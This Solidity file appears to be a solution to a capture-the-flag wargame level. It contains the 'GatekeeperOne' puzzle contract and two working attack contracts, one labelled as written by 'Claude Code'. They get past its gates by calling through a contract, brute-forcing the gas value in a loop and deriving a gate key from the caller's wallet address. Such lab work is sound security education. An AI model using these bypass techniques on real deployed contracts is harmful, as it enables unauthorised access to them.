// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        //just call with a contract to bypass this gate.
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        //brute force using loop
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        //match the condition easy once you understand the logic
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperHack {
    GatekeeperOne private immutable target;
    bytes8 public gateKey;

    constructor(address payable _address, bytes8 _gateKey) {
        target = GatekeeperOne(_address);
        gateKey = _gateKey;
    }

    function callenter() public {
        for (uint i = 0; i < 300; i++) {
            (bool success, ) = address(target).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if(success){
                break;
            }
        }
    }
}

//0x10D09586C3F5Ba8Abb2e440FfC0F5Abbc7545450 = my wallet address (It is using tx.origin so my address to be used)
//uint16 = last 4 bits (2 bytes) = 5450
//uint16(uint160(tx.origin)) = 0x5450
//uint32(uint64(gatekey)) = "0x5450" => uint32 will have 4 bytes that is 8 bits => 0x00005450
//uint64 => 1000000000005450 (Note 0x is just to show as hex)
//0x1000000000005450 should satisfy all the conditions

//Claude Code

contract GatekeeperHackClaude {
    GatekeeperOne private immutable target;
    bytes8 public gateKey;

    constructor(address _address) {
        target = GatekeeperOne(_address);
        gateKey =
            bytes8(uint64(uint16(uint160(tx.origin)))) |
            0x1000000000000000;
    }

    function callenter() public {
        for (uint i = 0; i < 300; i++) {
            (bool success, ) = address(target).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) break;
        }
    }
}

//The claude code worked ...Sed
